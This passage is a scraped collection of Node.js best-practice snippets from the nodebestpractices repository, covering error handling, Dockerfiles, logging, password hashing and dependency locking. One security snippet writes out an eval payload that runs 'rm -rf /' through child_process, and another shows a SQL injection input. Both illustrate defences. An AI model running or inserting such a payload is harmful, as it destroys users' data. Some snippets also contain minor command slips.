CMD [ "node", "dist/app.js" ]
```

----------------------------------------

TITLE: Best Practice: Tagging Promise-Returning Function as Async in Javascript
DESCRIPTION: This snippet shows the recommended practice to fix the issue from the previous anti-pattern. The function `changedFromSyncToAsyncFn` that returns a promise is correctly tagged as `async` and uses `await` before returning. This allows the v8 engine to include its frame in the async stacktrace when an error occurs.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/returningpromises.md#_snippet_3

LANGUAGE: javascript
CODE:
```
async function throwAsync () {
  await null // need to await at least something to be truly async (see note #2)
  throw Error('with all frames present')
}

async function changedFromSyncToAsyncFn () {
  return await throwAsync()
}

async function asyncFn () {
  return await changedFromSyncToAsyncFn()
}

// 👍 now changedFromSyncToAsyncFn would present in the stacktrace
asyncFn().catch(console.log)
```

----------------------------------------

TITLE: Using Docker Build Secret Mounting - Dockerfile
DESCRIPTION: Demonstrates the recommended, albeit experimental (as of July 2020), method for securely using secrets during a Docker build. It uses the `--mount=type=secret` option within a RUN command to make a secret file (like .npmrc) available only during the execution of that command, preventing the secret from being baked into any image layer. Requires Docker buildkit.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/avoid-build-time-secrets.french.md#_snippet_0

LANGUAGE: Dockerfile
CODE:
```
# syntax = docker/dockerfile:1.0-experimental

FROM node:12-slim

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN --mount=type=secret,id=npm,target=/root/.npmrc npm ci

# The rest comes here
```

----------------------------------------

TITLE: Configuring Nginx to Serve Static Files
DESCRIPTION: This Nginx configuration snippet shows how to set up a server block to handle requests for common static file types (images, JavaScript, CSS, etc.). It configures gzip compression, defines a root directory for static files, disables access logging for performance, and sets long cache expiration headers.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/frontendout.korean.md#_snippet_0

LANGUAGE: Nginx
CODE:
```
# configure gzip compression
gzip on;
keepalive 64;

# defining web server
server {
listen 80;
listen 443 ssl;

# handle static content
location ~ ^/(images/|img/|javascript/|js/|css/|stylesheets/|flash/|media/|static/|robots.txt|humans.txt|favicon.ico) {
root /usr/local/silly_face_society/node/public;
access_log off;
expires max;
}

```

----------------------------------------

TITLE: Setting HPKP Header: HTTP Header
DESCRIPTION: This example sets the HTTP Public Key Pinning (HPKP) policy. It pins two specific public key hashes, sets the policy duration to 2592000 seconds, includes subdomains, and specifies a URI to report validation failures. This helps prevent impersonation using fraudulent SSL/TLS certificates.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/secureheaders.md#_snippet_1

LANGUAGE: HTTP Header
CODE:
```
Public-Key-Pins: pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM="; pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g="; report-uri="http://example.com/pkp-report"; max-age=2592000; includeSubDomains
```

----------------------------------------

TITLE: Querying Winston Logs JavaScript
DESCRIPTION: Shows how to use Winston's 'query' method to retrieve log entries. It defines options for the query, including time range, limit, start, order, and fields to retrieve. The results are processed asynchronously in a callback function. Requires winston and appropriate log transports that support querying.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/usematurelogger.korean.md#_snippet_1

LANGUAGE: javascript
CODE:
```
var options = {
  from: new Date - 24 * 60 * 60 * 1000,
  until: new Date,
  limit: 10,
  start: 0,
  order: 'desc',
  fields: ['message']
};


// Find items logged between today and yesterday.
winston.query(options, function (err, results) {
  // execute callback with results
});
```

----------------------------------------

TITLE: Configuring Log Routing - Docker Daemon - JSON5
DESCRIPTION: Provides an example configuration for the Docker daemon's 'daemon.json' file to demonstrate how the execution environment handles log routing. It specifies a logging driver ('splunk') and associated options ('splunk-token', 'splunk-url') to capture container logs (from stdout/stderr) and send them to an external service like Splunk, abstracting routing away from the application code.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/logrouting.md#_snippet_2

LANGUAGE: json5
CODE:
```
{
  "log-driver": "splunk", // just using Splunk as an example, it could be another storage type
  "log-opts": {
    "splunk-token": "",
    "splunk-url": "",
    //...
  }
}
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with Bcrypt in Node.js
DESCRIPTION: This snippet demonstrates how to use the `bcrypt` library in Node.js to asynchronously hash a user password and later compare a provided password input against the stored hash. It shows the basic workflow of password storage and verification using bcrypt's `hash` and `compare` functions, suggesting a minimum cost of 12 iterations.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const iterations = 12;
try {
// asynchronously generate a secure password
  const hash = await bcrypt.hash('myPassword', iterations);
  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = await bcrypt.compare('somePassword', hash);
  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
} catch {
  logger.error('could not hash password.')
}
```

----------------------------------------

TITLE: Representing dependencies and locks - JSON
DESCRIPTION: This JSON snippet shows the structure of the `package.json` file as used for locking dependencies in npm versions 5 and above. It includes the `lockfileVersion`, lists dependencies with their exact versions, resolved URLs from the registry, and integrity hashes for verification.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/lockdependencies.korean.md#_snippet_2

LANGUAGE: json
CODE:
```
{
    "name": "package-name",
    "version": "1.0.0",
    "lockfileVersion": 1,
    "dependencies": {
        "cacache": {
            "version": "9.2.6",
            "resolved": "https://registry.npmjs.org/cacache/-/cacache-9.2.6.tgz",
            "integrity": "sha512-YK0Z5Np5t755edPL6gfdCeGxtU0rcW/DBhYhYVDckT+7AFkCCtedf2zru5NRbBLFk6e7Agi/RaqTOAfiaipUfg=="
        },
        "duplexify": {
            "version": "3.5.0",
            "resolved": "https://registry.npmjs.org/duplexify/-/duplexify-3.5.0.tgz",
            "integrity": "sha1-GqdzAC4VeEV+nZ1KULDMquvL1gQ=",
            "dependencies": {
                "end-of-stream": {
                    "version": "1.0.0",
                    "resolved": "https://registry.npmjs.org/end-of-stream/-/end-of-stream-1.0.0.tgz",
                    "integrity": "sha1-1FlucCc0qT5A6a+GQxnqvZn/Lw4="
                }
            }
        }
    }
}
```

----------------------------------------

TITLE: Validating Complex JSON Input with Joi Javascript
DESCRIPTION: This snippet demonstrates how to use the Joi library to define a schema for complex JSON input and validate it within a function. The `Joi.assert` method is used to perform validation; it throws an error immediately if the input does not match the schema, implementing the 'fail fast' principle. This requires the Joi library as a dependency.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/failfast.md#_snippet_0

LANGUAGE: javascript
CODE:
```
const memberSchema = Joi.object().keys({
 password: Joi.string().regex(/^[a-zA-Z0-9]{3,30}$/),
 birthyear: Joi.number().integer().min(1900).max(2013),
 email: Joi.string().email()
});

function addNewMember(newMember) {
 // assertions come first
 Joi.assert(newMember, memberSchema); //throws if validation fails
 // other logic here
}
```

----------------------------------------

TITLE: Demonstrating Linter Detection: Lodash Map Usage (JavaScript)
DESCRIPTION: This simple JavaScript snippet demonstrates code that would be flagged by the `eslint-plugin-you-dont-need-lodash-underscore` plugin. It requires the 'lodash' library and uses the `_.map` method. When this code is linted with the plugin configured, ESLint will issue a warning or suggestion to use the native `Array.prototype.map` method instead.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.md#_snippet_2

LANGUAGE: javascript
CODE:
```
const _ = require('lodash');
// ESLint will flag the line above with a suggestion
console.log(_.map([0, 1, 2, 4, 8, 16], x => `d${x}`));
```

----------------------------------------

TITLE: Structuring Application by Component - Good Example - Bash
DESCRIPTION: This Bash directory structure illustrates a recommended approach for structuring a medium-to-large application by business components (e.g., orders, users, payments). Each component is self-contained with its own internal layers (API, domain, data access) and depends on shared cross-component libraries. This promotes modularity, easier maintenance, and clear separation of concerns.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/projectstructre/breakintcomponents.md#_snippet_0

LANGUAGE: bash
CODE:
```
my-system
├─ apps (components)
│  ├─ orders
│  │ ├─ package.json
│  │ ├─ api
│  │ ├─ domain
│  │ ├─ data-access
│  ├─ users
│  ├─ payments
├─ libraries (generic cross-component functionality)
│  ├─ logger
│  ├─ authenticator
```

----------------------------------------

TITLE: Illustrating Docker :latest Tag Updates (Bash)
DESCRIPTION: This bash snippet demonstrates the behavior of the `:latest` tag during Docker builds. It shows that building an image without an explicit tag or specifically with `:latest` updates the `:latest` tag, while building with a non-`:latest` explicit tag does not. This unpredictable update behavior makes `:latest` unsuitable for production unless explicitly managed.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/image-tags.md#_snippet_0

LANGUAGE: bash
CODE:
```
$ docker build -t company/image_name:0.1 .
# :latest image is not updated
$ docker build -t company/image_name
# :latest image is updated
$ docker build -t company/image_name:0.2 .
# :latest image is not updated
$ docker build -t company/image_name:latest .
# :latest image is updated
```

----------------------------------------

TITLE: Throwing Built-in Error in JavaScript
DESCRIPTION: Demonstrates the correct way to throw the standard built-in Error object in various JavaScript contexts: synchronous code, using an EventEmitter, and within an async function/Promise. Using `new Error(...)` ensures that valuable information like the stack trace is captured.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/useonlythebuiltinerror.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// throwing an Error from typical function, whether sync or async
if(!productToAdd)
    throw new Error('How can I add new product when no value provided?');

// 'throwing' an Error from EventEmitter
const myEmitter = new MyEmitter();
myEmitter.emit('error', new Error('whoops!'));

// 'throwing' an Error from a Promise
const addProduct = async (productToAdd) => {
  try {
    const existingProduct = await DAL.getProduct(productToAdd.id);
    if (existingProduct !== null) {
      throw new Error('Product already exists!');
    }
  } catch (err) {
    // ...
  }
}
```

----------------------------------------

TITLE: Using Tini to Forward Signals in Dockerfile
DESCRIPTION: This Dockerfile uses `tini` as the entrypoint (PID 1) to ensure that signals like SIGTERM are properly forwarded to the Node.js application running as a child process. This is an alternative to running Node.js directly as PID 1, providing robust signal handling in container environments. It requires adding `tini` to the image.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.french.md#_snippet_1

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

ENV TINI_VERSION v0.19.0
ADD https://github.com/krallin/tini/releases/download/${TINI_VERSION}/tini /tini
RUN chmod +x /tini
ENTRYPOINT ["/tini", "--"]

CMD ["node", "index.js"]
#Now Node will run a sub-process of TINI which acts as PID1
```

----------------------------------------

TITLE: Antipattern: Using String CMD for Node.js in Docker; Dockerfile
DESCRIPTION: This snippet shows another antipattern: using the string form of the CMD instruction like `CMD "node server.js"`. While it directly invokes node, the string form executes the command in a shell (`/bin/sh` or `/bin/bash`), adding an unnecessary intermediate process and potentially complicating signal handling compared to the exec form.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.french.md#_snippet_3

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

# don’t do that, it will start bash
CMD "node server.js"
```

----------------------------------------

TITLE: Anti-Pattern Using NPM Start Dockerfile
DESCRIPTION: This Dockerfile snippet illustrates an anti-pattern where the Node.js application is started using `npm start`. In this configuration, `npm` runs as the container's PID 1, and the Node.js process runs as a child of `npm`. `npm` typically does not forward signals like SIGTERM correctly to its child process, preventing the Node.js application from implementing graceful shutdown logic.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

CMD ["npm", "start"]
#Now Node will run a sub-process of npm and won't receive signals

```

----------------------------------------

TITLE: Building Non-Root Docker Image - Dockerfile
DESCRIPTION: This Dockerfile provides an example of how to build a secure Docker image for a Node.js application that runs as a non-root user. It sets up the application environment, installs dependencies, copies code, exposes a non-privileged port (3000), and crucially sets the user to 'node' before defining the command to run the server, adhering to the principle of least privilege.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/non-root-user.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:latest

COPY package.json .
RUN npm install
COPY . .
EXPOSE 3000
USER node
CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Demonstrating Global Test Fixture Anti-Pattern - JavaScript
DESCRIPTION: This code illustrates the anti-pattern of relying on global test fixtures set up outside individual tests (e.g., in a `before` block). It shows how tests become coupled and dependent on external, potentially mutable, shared data, leading to unexpected failures when one test alters data that another test expects to remain unchanged.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/avoid-global-test-fixture.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
before(() => {
  //Arrange - adding sites and admins data to our DB. Where is the data? outside. At some external json or migration framework
  await DB.AddSeedDataFromJson('seed.json');
});
```

LANGUAGE: JavaScript
CODE:
```
it('When updating site name, get successful confirmation', async () => {
  //Arrange - I know that site name 'portal' exists - I saw it in the seed files
  const siteToUpdate = await SiteService.getSiteByName('Portal');

  //Act
  const updateNameResult = await SiteService.changeName(siteToUpdate, 'newName');

  //Assert
  expect(updateNameResult).to.be(true);
});
```

LANGUAGE: JavaScript
CODE:
```
it('When querying by site name, get the right site', async () => {
  //Act - I know that site name 'portal' exists - I saw it in the seed files
  const siteToCheck = await SiteService.getSiteByName('Portal');

  //Assert
  expect(siteToCheck.name).to.be.equal('Portal'); //Failure! The previous test change the name :[
});
```

----------------------------------------

TITLE: Demonstrating Standard HTML Tag Interpretation - HTML
DESCRIPTION: This simple HTML snippet illustrates the standard behavior of the <strong> tag. When rendered by a web browser, the content "This is bold text." will be displayed in a bold font because the angle brackets < and > enclosing strong are interpreted as HTML syntax markers. This contrasts with escaped output where these characters are treated as literal text.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.md#_snippet_2

LANGUAGE: html
CODE:
```
<strong>This is bold text.</strong>

```

----------------------------------------

TITLE: Configuring npm: Enforcing exact dependency versions in npmrc
DESCRIPTION: This snippet shows how to configure npm using a .npmrc file to ensure that dependencies are installed and saved with their exact version numbers. This prevents unexpected updates to patch or minor versions during npm install which could introduce breaking changes or bugs. Place this file in the project's root directory.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/lockdependencies.md#_snippet_0

LANGUAGE: npmrc
CODE:
```
// save this as .npmrc file on the project directory
save-exact:true
```

----------------------------------------

TITLE: Scanning Container Image with Trivy in Bash
DESCRIPTION: This snippet demonstrates how to install and run the Trivy container image scanner using bash commands. It requires `rpm` for dependency management, downloads the Trivy deb package, installs it, and then executes the `trivy image` command against a specified container image name to scan for vulnerabilities.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/scan-images.md#_snippet_0

LANGUAGE: Bash
CODE:
```
$ sudo apt-get install rpm
$ wget https://github.com/aquasecurity/trivy/releases/download/{TRIVY_VERSION}/trivy_{TRIVY_VERSION}_Linux-64bit.deb
$ sudo dpkg -i trivy_{TRIVY_VERSION}_Linux-64bit.deb
$ trivy image [YOUR_IMAGE_NAME]
```

----------------------------------------

TITLE: Inspecting Dockerfiles with Hadolint - Bash
DESCRIPTION: This snippet demonstrates basic usage of the `hadolint` command-line tool to lint Dockerfiles. It shows how to lint a specific file, how to exclude specific rules using `--ignore`, and how to define trusted registries using `--trusted-registry` to warn against untrusted base images. Requires the Hadolint executable to be installed and accessible.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/lint-dockerfile.french.md#_snippet_0

LANGUAGE: bash
CODE:
```
hadolint production.Dockerfile
hadolint --ignore DL3003 --ignore DL3006 <Dockerfile> # exclude specific rules
hadolint --trusted-registry my-company.com:500 <Dockerfile> # Warn when using untrusted FROM images
```

----------------------------------------

TITLE: Cleaning npm Cache in Dockerfile Build
DESCRIPTION: This Dockerfile snippet illustrates how to build a Node.js application image, install dependencies using `npm ci --production`, and subsequently clean the npm cache. The `npm cache clean --force` command removes cached packages, helping to reduce the final Docker image size. The `--force` flag is included to prevent the command from failing.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/clean-cache.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm cache clean --force

# The rest comes here
```

----------------------------------------

TITLE: Demonstrating HTML Entity Encoding - HTML
DESCRIPTION: This snippet shows the HTML entity encoding of the <strong> tag. By replacing < with &lt; and > with &gt;, the browser is instructed to render these characters literally instead of interpreting them as HTML syntax. The output will display the literal text "&lt;strong&gt;This is bold text.&lt;/strong&gt;" rather than bold text, effectively escaping the HTML tags.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.md#_snippet_3

LANGUAGE: html
CODE:
```
&lt;strong&gt;This is bold text.&lt;/strong&gt;

```

----------------------------------------

TITLE: Demonstrating Recursive File Copy Anti-Pattern in Dockerfile
DESCRIPTION: Shows a Dockerfile command that recursively copies all contents from the current directory (.) in the build context to the working directory (.) inside the Docker image. This is an anti-pattern because it can inadvertently include sensitive files and slow down builds if a .dockerignore is not effectively used.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/docker-ignore.french.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
# The next line copies everything
COPY . .

# The rest comes here

```

----------------------------------------

TITLE: Bootstrapping Node.js App in Docker; Dockerfile
DESCRIPTION: This snippet shows the recommended way to start a Node.js application in a Docker container using the exec form of the CMD instruction. This method ensures that signals (like SIGTERM) are correctly forwarded to the Node.js process, allowing for graceful shutdown and avoiding unnecessary intermediate shell processes.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/bootstrap-using-node.french.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim AS build

WORKDIR /usr/src/app
COPY package.json package-lock.json ./
RUN npm ci --production && npm clean cache --force

CMD ["node", "server.js"]
```

----------------------------------------

TITLE: Defining Docker Build Exclusions using .dockerignore
DESCRIPTION: Specifies a list of files and directories to be ignored by the Docker build process. This prevents sensitive data, development artifacts, and unnecessary files from being copied into the build context, improving security and build speed. It's a recommended default for Node.js projects.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/docker-ignore.french.md#_snippet_0

LANGUAGE: Configuration
CODE:
```
**/node_modules/
**/.git
**/README.md
**/LICENSE
**/.vscode
**/npm-debug.log
**/coverage
**/.env
**/.editorconfig
**/.aws
**/dist
```

----------------------------------------

TITLE: Linting Dockerfiles with Hadolint in Bash
DESCRIPTION: This snippet shows various ways to use the `hadolint` command-line tool to analyze and lint a Dockerfile. It includes the basic command, ignoring specific rules using `--ignore`, and specifying trusted registries with `--trusted-registry`. This helps identify potential issues and enforce best practices in Dockerfiles.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/lint-dockerfile.md#_snippet_0

LANGUAGE: bash
CODE:
```
hadolint production.Dockerfile
hadolint --ignore DL3003 --ignore DL3006 <Dockerfile> # exclude specific rules
hadolint --trusted-registry my-company.com:500 <Dockerfile> # Warn when using untrusted FROM images
```

----------------------------------------

TITLE: Initializing Winston Logger JavaScript
DESCRIPTION: Demonstrates how to create a new Winston logger instance configured with a console transport. It sets the minimum logging level to 'info'. A sample log message is included to show how to use the logger with parameters and metadata. Requires the 'winston' library.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/usematurelogger.korean.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// your centralized logger object
var logger = new winston.Logger({
  level: 'info',
  transports: [
    new (winston.transports.Console)()
  ]
});

// custom code somewhere using the logger
logger.log('info', 'Test Log Message with some parameter %s', 'some parameter', { anything: 'This is metadata' });
```

----------------------------------------

TITLE: Handling Errors with Async/Await - JavaScript
DESCRIPTION: Illustrates using `async/await` syntax to write asynchronous code that looks synchronous, enabling traditional `try...catch...finally` blocks for error handling. This approach provides a familiar error handling pattern and ensures resource cleanup in the `finally` block.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/asyncerrorhandling.md#_snippet_1

LANGUAGE: JavaScript
CODE:
```
async function executeAsyncTask () {
  try {
    const valueA = await functionA();
    const valueB = await functionB(valueA);
    const valueC = await functionC(valueB);
    return await functionD(valueC);
  }
  catch (err) {
    logger.error(err);
  } finally {
    await alwaysExecuteThisFunction();
  }
}
```

----------------------------------------

TITLE: Demonstrating SQL Injection Vulnerability - SQL
DESCRIPTION: This SQL snippet demonstrates a typical SQL injection vulnerability where user input is directly concatenated into the WHERE clause of a SELECT statement. This allows an attacker to inject malicious SQL code, such as 'evil'input'', which can alter the query's structure and execution, leading to unauthorized data access or manipulation.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/ormodmusage.md#_snippet_1

LANGUAGE: sql
CODE:
```
SELECT username, firstname, lastname FROM users WHERE id = 'user input';

SELECT username, firstname, lastname FROM users WHERE id = 'evil'input';
```

----------------------------------------

TITLE: Packaging Common Utilities as Modules - Bash
DESCRIPTION: This snippet demonstrates how to structure a reusable utility, such as a logger, within the 'libraries' folder. By giving it its own package.json, it becomes an independent package, enhancing encapsulation and allowing for easier reuse and potential publishing.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
my-system
├─ apps (components)
  │  ├─ component-a
├─ libraries (generic cross-component functionality)
│  ├─ logger
│  │  ├─ package.json
│  │  ├─ src
│  │  │ ├─ index.js
```

----------------------------------------

TITLE: Validating Entity with jsonschema JavaScript
DESCRIPTION: This JavaScript snippet shows a Product class integrating validation using the jsonschema library. The validate method performs the validation check, comparing the current object instance against a static schema definition (expected to be defined elsewhere, like in the JSON example). It requires the jsonschema library to be installed.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/validation.french.md#_snippet_1

LANGUAGE: javascript
CODE:
```
const JSONValidator = require('jsonschema').Validator;

class Product {

  validate() {
    const v = new JSONValidator();

    return v.validate(this, schema);
  }

  static get schema() {
    //define JSON-Schema, see example above
  }
}

```

----------------------------------------

TITLE: Demonstrating eval Security Vulnerability in JavaScript
DESCRIPTION: This code snippet illustrates the security risk of using `eval()` with untrusted input. It shows how a string containing malicious code, potentially originating from an attacker, can be passed to `eval()` and executed, leading to harmful actions like deleting system files.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/avoideval.md#_snippet_0

LANGUAGE: javascript
CODE:
```
// example of malicious code which an attacker was able to input
const userInput = "require('child_process').spawn('rm', ['-rf', '/'])";

// malicious code executed
eval(userInput);
```

----------------------------------------

TITLE: Benchmarking Application Performance Shell
DESCRIPTION: This shell command uses `clinic doctor` in combination with `autocannon` to benchmark a Node.js application that might have Event Loop issues. `clinic doctor` analyzes the running application, and `autocannon` generates HTTP load on the specified endpoint (`localhost:$PORT`), allowing for performance measurement like latency and requests per second.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/block-loop.md#_snippet_1

LANGUAGE: shell
CODE:
```
clinic doctor --on-port 'autocannon localhost:$PORT' -- node slow-event-loop
```

----------------------------------------

TITLE: Hashing and Comparing Passwords with Bcrypt (JavaScript)
DESCRIPTION: Demonstrates the asynchronous process of generating a password hash using the popular `bcrypt` library with a specified iteration count and subsequently comparing a plain password string against a stored hash to verify authenticity.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/userpasswords.french.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
const iterations = 12;
try {
// asynchronously generate a secure password
  const hash = await bcrypt.hash('myPassword', iterations);
  // Store secure hash in user record

  // compare a provided password input with saved hash
  const match = await bcrypt.compare('somePassword', hash);
  if (match) {
   // Passwords match
  } else {
   // Passwords don't match
  }
} catch {
  logger.error('could not hash password.')
}
```

----------------------------------------

TITLE: Defining Centralized Error Handler Object - Node.js Javascript
DESCRIPTION: Defines a basic Javascript object intended to serve as a centralized error handler. It exposes a `handleError` method responsible for logging the error, firing monitoring metrics, and deciding whether to crash the process or send a response. Depends on `logger` and monitoring/response utilities.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/centralizedhandling.md#_snippet_2

LANGUAGE: javascript
CODE:
```
module.exports.handler = new errorHandler();

function errorHandler() {
  this.handleError = async (error, responseStream) => {
    await logger.logError(error);
    await fireMonitoringMetric(error);
    await crashIfUntrustedErrorOrSendResponse(error, responseStream);
  };
}
```

----------------------------------------

TITLE: Copying Source and Building Application Later - Dockerfile
DESCRIPTION: Following the dependency installation, this snippet demonstrates copying the rest of the application source code and running the build command (like `npm run build`). This step is placed later because application code changes frequently, ensuring that cache invalidation is limited to layers below this point.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.french.md#_snippet_2

LANGUAGE: Dockerfile
CODE:
```
COPY . .
RUN npm run build
```

----------------------------------------

TITLE: Configuring ESLint Plugin - JSON
DESCRIPTION: This JSON snippet shows how to configure ESLint to utilize the `eslint-plugin-you-dont-need-lodash-underscore`. By adding the plugin's `compatible` configuration to the `extends` array, ESLint will check for and report instances where native JavaScript methods can be used instead of Lodash or Underscore.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/performance/nativeoverutil.french.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "extends": [
    "plugin:you-dont-need-lodash-underscore/compatible"
  ]
}
```

----------------------------------------

TITLE: Whitelisting Files for npm Publish (package.json)
DESCRIPTION: This snippet demonstrates how to use the `files` array within a `package.json` file. This array acts as a whitelist, specifying only the files and directories that should be included in the published npm package. Any files not listed here will be excluded.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/avoid_publishing_secrets.md#_snippet_1

LANGUAGE: json
CODE:
```
{
  "files" : [
    "dist/moment.js",
    "dist/moment.min.js"
  ]
}
```

----------------------------------------

TITLE: Querying GraphQL API with Invalid ID - GraphQL
DESCRIPTION: This GraphQL query demonstrates a client-side request to the Star Wars API (SWAPI) attempting to fetch a film by its ID. It is specifically designed to fail because the provided ID '1ZmlsbXM6MQ==' is invalid, illustrating how an incorrect input can lead to a GraphQL error.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/errorhandling/documentingusingswagger.korean.md#_snippet_0

LANGUAGE: graphql
CODE:
```
# should fail because id is not valid
{
  film(id: "1ZmlsbXM6MQ==") {
    title
  }
}
```

----------------------------------------

TITLE: Configuring npm exact versions - npmrc
DESCRIPTION: This snippet shows how to configure an `.npmrc` file to instruct npm to use the exact version specified in `package.json` when adding new dependencies using `npm install --save <package>`. This prevents the use of caret (^) or tilde (~) ranges by default.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/lockdependencies.korean.md#_snippet_0

LANGUAGE: npmrc
CODE:
```
// save this as .npmrc file on the project directory
save-exact:true
```

----------------------------------------

TITLE: Copying Node Package Files and Installing Dependencies (Dockerfile)
DESCRIPTION: Illustrates the recommended Dockerfile pattern for copying `package.json` and `package-lock.json` first, followed by running `npm ci`. This ensures the dependency installation layer is cached if the package files haven't changed, saving precious build time.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/use-cache-for-shorter-build-time.md#_snippet_1

LANGUAGE: Dockerfile
CODE:
```
COPY "package.json" "package-lock.json" "./"
RUN npm ci
```

----------------------------------------

TITLE: Configuring Node.js as Root Process Dockerfile
DESCRIPTION: This Dockerfile configures the Node.js application to run as the root process (PID 1) inside the container. By using `CMD ["node", "index.js"]`, Node.js directly receives signals like SIGTERM, which is crucial for implementing graceful shutdown logic in containerized environments like Kubernetes.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/docker/graceful-shutdown.french.md#_snippet_0

LANGUAGE: dockerfile
CODE:
```
FROM node:12-slim

# Build logic comes here

CMD ["node", "index.js"]
#This line above will make Node.js the root process (PID1)
```

----------------------------------------

TITLE: Illustrating Interpreted HTML Tags
DESCRIPTION: This snippet demonstrates how standard HTML tags like <strong> are interpreted by the browser to format text. It serves as a contrast to escaped output, showing the default behavior when special characters (angle brackets) are not escaped.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.french.md#_snippet_2

LANGUAGE: HTML
CODE:
```
<strong>This is bold text.</strong>
```

----------------------------------------

TITLE: Demonstrating Standard HTML Tag Interpretation - HTML
DESCRIPTION: This basic HTML snippet shows how the <strong> tag is interpreted by a web browser to render the enclosed text in a bold font. It serves as a simple illustration of how HTML tags have special meaning and are executed by the browser, contrasting with situations where untrusted user input containing similar characters must be escaped to prevent interpretation.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/security/escape-output.polish.md#_snippet_2

LANGUAGE: html
CODE:
```
<strong>This is bold text.<\/strong>
```

----------------------------------------

TITLE: Representing dependency tree - JSON
DESCRIPTION: This JSON snippet illustrates the structure of a `npm-shrinkwrap.json` file. This file explicitly defines the entire dependency tree, including sub-dependencies and their exact versions, guaranteeing that `npm install` will always install the specific versions listed.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/production/lockdependencies.korean.md#_snippet_1

LANGUAGE: json
CODE:
```
{
    "name": "A",
    "dependencies": {
        "B": {
            "version": "0.0.1",
            "dependencies": {
                "C": {
                    "version": "0.1.0"
                }
            }
        }
    }
}
```

----------------------------------------

TITLE: Example Long Line of Code (Before Prettier) - JavaScript
